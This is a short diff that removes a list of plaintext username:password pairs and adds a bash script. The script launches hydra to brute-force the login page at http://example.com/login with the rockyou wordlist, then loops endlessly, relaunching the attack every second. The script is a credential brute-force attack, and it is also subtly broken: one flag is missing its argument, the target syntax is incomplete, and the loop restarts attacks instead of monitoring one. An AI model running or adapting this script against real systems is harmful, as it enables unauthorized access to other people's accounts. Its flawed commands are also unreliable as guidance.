@@ -1,4 +1,10 @@
-wolverine : Log@N
-thor : Asgard
-johnny : m3ph1st0ph3l3s
-neo : trinity
+#!/bin/bash
+
+# Start hydra
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o -v -b 4 http://example.com/login
+
+# Monitor the brute force progress
+while true; do
+    sleep 1
+    hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -f -o -v -b 4 http://example.com/login | grep "done"
+done
